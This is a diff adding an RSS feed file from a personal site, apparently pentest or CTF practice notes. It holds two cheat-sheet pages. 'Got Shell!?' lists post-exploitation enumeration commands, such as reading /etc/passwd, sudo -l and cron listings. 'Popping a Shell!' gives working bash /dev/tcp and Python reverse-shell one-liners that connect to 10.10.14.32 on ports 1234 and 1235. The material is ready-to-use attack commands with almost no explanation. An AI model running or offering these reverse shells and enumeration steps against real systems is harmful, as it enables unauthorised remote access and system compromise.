@@ -1,0 +1,18 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Pages on Masoopy</title><link>https://www.masoopy.com/pages/</link><description>Recent content in Pages on Masoopy</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Wed, 10 Feb 2021 17:23:05 +0100</lastBuildDate><atom:link href="https://www.masoopy.com/pages/index.xml" rel="self" type="application/rss+xml"/><item><title>Got Shell!?</title><link>https://www.masoopy.com/pages/got-shell/</link><pubDate>Wed, 10 Feb 2021 17:23:05 +0100</pubDate><guid>https://www.masoopy.com/pages/got-shell/</guid><description>What to do when you have a shell?
+Linux history
+whoami
+uname -a
+cat /etc/issue
+cat /etc/passwd
+sudo -l
+crontab -l
+ls -lhtrR /etc/cron*
+ls -lhtrR /home
+Windows set
+getuid
+ipconfig /all
+arp -a
+netstat -ano</description></item><item><title>Popping a Shell!</title><link>https://www.masoopy.com/pages/popping-a-shell/</link><pubDate>Wed, 10 Feb 2021 17:23:05 +0100</pubDate><guid>https://www.masoopy.com/pages/popping-a-shell/</guid><description>A few ways to pop a shell&amp;hellip;
+/bin/bash -c 'bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.32/1234 0&amp;gt;&amp;amp;1'
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;quot;10.10.14.32&amp;quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&amp;quot;/bin/sh&amp;quot;,&amp;quot;-i&amp;quot;]);'
+import socket,subprocess,os s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) s.connect((&amp;#34;10.10.14.32&amp;#34;,1235)) os.dup2(s.fileno(),0) os.dup2(s.fileno(),1) os.dup2(s.fileno(),2) p=subprocess.call([&amp;#34;/bin/sh&amp;#34;,&amp;#34;-i&amp;#34;])</description></item></channel></rss>
